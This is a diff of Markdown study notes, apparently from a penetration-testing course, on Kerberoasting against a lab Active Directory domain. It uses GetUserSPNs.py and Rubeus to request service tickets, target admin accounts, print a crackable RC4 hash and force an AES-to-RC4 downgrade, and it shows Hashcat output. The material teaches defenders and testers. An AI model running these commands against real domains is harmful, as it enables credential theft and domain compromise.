@@ -32,7 +32,7 @@ adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLeg
 
 #### Requesting all TGS tickets
 
-You can now pull all TGS tickets for offline processing using the ```-request``` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John.
+You can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John.
 
 ```bash
 d41y@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
@@ -528,14 +528,14 @@ PS C:\htb> .\Rubeus.exe kerberoast /stats
  ----------------------------------
  | 2022                   | 9     |
  ----------------------------------
- ```
+```
 
 ##### Using the /nowrap Flag
 
- Use Rubeus to request tickets for accounts with the ```admincount``` attribute set to 1. These would likely be high-value targets and worth your initial focus for offline cracking efforts with Hashcat. Be sure to specify the ```/nowrap``` flag so that the hash can be more easily copied down for offline cracking.
+ Use Rubeus to request tickets for accounts with the `admincount` attribute set to 1. These would likely be high-value targets and worth your initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking.
 
- ```powershell
- PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 
    ______        _
   (_____ \      | |
@@ -568,9 +568,9 @@ PS C:\htb> .\Rubeus.exe kerberoast /stats
 
 ### Note on Encryption Types
 
-Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, you will retrieve hashes that begin with ```$krb5tgs$23$*```, an RC4 encrypted ticket. Sometimes you will receive an AES-256 encrypted hash or hash that begins with ```$krb5tgs$18$*```. While it is possible to crack AES-128 and AES-256 TGS tickets, it will typically be significantly more time consuming than cracking an RC4 encrypted ticket, but still possible especially if a weak password is chosen.
+Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, you will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 encrypted ticket. Sometimes you will receive an AES-256 encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 and AES-256 TGS tickets, it will typically be significantly more time consuming than cracking an RC4 encrypted ticket, but still possible especially if a weak password is chosen.
 
-Start by creating an SPN account named ```testspn``` and using Rubeus to Kerberoast this specific user to test this out.
+Start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out.
 
 ```powershell
 PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
@@ -595,7 +595,7 @@ PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
 [*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D05B420D76BF298226AADB53F2AA048BE813B5F0CA7A85A9BB8C7F70F16F746807D3B84AA8FE91B8C38AF75FB9DA49ED133168760D004781963DB257C2339FD82B95C5E1F8F8C4BD03A9FA12E87E278915A8362DA835B9A746082368A155EBB5EFB141DC58F2E46B7545F82278AF4214E1979B35971795A3C4653764F08C1E2A4A1EDA04B1526079E6423C34F88BDF6FA2477D28C71C5A55FA7E1EA86D93565508081E1946D796C0B3E6666259FEB53804B8716D6D076656BA9D392CB747AD3FB572D7CE130940C7A6415ADDB510E2726B3ACFA485DF5B7CE6769EEEF08FE7290539830F6DA25C359894E85A1BCFB7E0B03852C7578CB52E753A23BE59AB9D1626091376BA474E4BAFAF6EBDD852B1854FF46AA6CD1F7F044A90C9497BB60951C4E82033406ACC9B4BED7A1C1AFEF41316A58487AFEA4D5C07940C87367A39E66415D9A54B1A88DADE1D4A0D13ED9E474BDA5A865200E8F111996B846E4E64F38482CEE8BE4FC2DC1952BFFBD221D7284EFF27327C0764DF4CF68065385D31866DA1BB1A189E9F82C46316095129F06B3679EE1754E9FD599EB9FE96C10315F6C45300ECCBEB6DC83A92F6C08937A244C458DB69B80CE85F0101177E6AC049C9F11701E928685F41E850CA62F047B175ADCA78DCA2171429028CD1B4FFABE2949133A32FB6A6DC9E0477D5D994F3B3E7251FA8F3DA34C58FAAE20FC6BF94CC9C10327984475D7EABE9242D3F66F81CFA90286B2BA261EBF703ADFDF7079B340D9F3B9B17173EBA3624D9B458A5BD1CB7AF06749FF3DB312BCE9D93CD9F34F3FE913400655B4B6F7E7539399A2AFA45BD60427EA7958AB6128788A8C0588023DDD9CAA4D35459E9DEE986FD178EB14C2B8300C80931624044C3666669A68A665A72A1E3ABC73E7CB40F6F46245B206777EE1EF43B3625C9F33E45807360998B7694DC2C70ED47B45172FA3160FFABAA317A203660F26C2835510787FD591E2C1E8D0B0E775FC54E44A5C8E5FD1123FBEDB463DAFDFE6A2632773C3A1652970B491EC7744757872C1DDC22BAA7B4723FEC91C154B0B4262637518D264ADB691B7479C556F1D10CAF53CB7C5606797F0E00B759FCA56797AAA6D259A47FCCAA632238A4553DC847E0A707216F0AE9FF5E2B4692951DA4442DF86CD7B10A65B786FE3BFC658CC82B47D9C256592942343D05A6F06D250265E6CB917544F7C87645FEEFA54545FEC478ADA01B8E7FB6480DE7178016C9DC8B7E1CE08D8FA7178D33E137A8C076D097C1C29250673D28CA7063C68D592C30DCEB94B1D93CD9F18A2544FFCC07470F822E783E5916EAF251DFA9726AAB0ABAC6B1EB2C3BF6DBE4C4F3DE484A9B0E06FF641B829B651DD2AB6F6CA145399120E1464BEA80DC3608B6C8C14F244CBAA083443EB59D9EF3599FCA72C6997C824B87CF7F7EF6621B3EAA5AA0119177FC480A20B82203081609E42748920274FEBB94C3826D57C78AD93F04400DC9626CF978225C51A889224E3ED9E3BFDF6A4D6998C16D414947F9E157CB1594B268BE470D6FB489C2C6C56D2AD564959C5
 ```
 
-Checking with PowerView, you can see that the ```msDS-SupportedEncryptionTypes``` attribute is set to 0. The chart here tells you that a decimal value of 0 means that a specific encryption type is not defined and set to the default of ```RC4_HMAC_MD5```.
+Checking with PowerView, you can see that the `msDS-SupportedEncryptionTypes` attribute is set to 0. The chart here tells you that a decimal value of 0 means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.
 
 ```powershell
 PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
@@ -638,7 +638,7 @@ Assuming that your client has set SPN accounts to support AES-128/AES-256 encryp
 
 ![ad kerberoasting 1](../../../../images/ad_kerberoasting1.png)
 
-If you check this with PowerView, you'll see that the ```msDS-SupportedEncryptionTypes``` attribute is set to 24, meaning that AES-128/AES-256 encryption types are the only ones supported.
+If you check this with PowerView, you'll see that the `msDS-SupportedEncryptionTypes` attribute is set to 24, meaning that AES-128/AES-256 encryption types are the only ones supported.
 
 ```powershell
 PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
@@ -702,13 +702,13 @@ Candidates.#1....: skitzy -> sammy<3
 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>
 ```
 
-You can use Rubeus with the ```/tgtdeleg``` flag to specify that you want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm you support in the body of the TGS request. This may be a failsafe built-in AD for backward compatibility. By using this flag, you can request an RC4 encrypted ticket that can be cracked much faster.
+You can use Rubeus with the `/tgtdeleg` flag to specify that you want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm you support in the body of the TGS request. This may be a failsafe built-in AD for backward compatibility. By using this flag, you can request an RC4 encrypted ticket that can be cracked much faster.
 
 ![ad kerberoasting 2](../../../../images/ad_kerberoasting2.png)
 
-In the above image, you can see that when supplying the ```tgtdeleg``` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES-128/AES-256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here you could downgrade from AES to RC4 and cut cracking time down by over 4 minutes.
+In the above image, you can see that when supplying the `tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES-128/AES-256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here you could downgrade from AES to RC4 and cut cracking time down by over 4 minutes.
 
-It is possible to edit the encryption types used in Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: ```Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options```, then double-clicking on ```Network security: Configure encryption types allowed for Kerberos``` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the DC Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
+It is possible to edit the encryption types used in Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the DC Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
 
 ## Mitigation & Detection
 
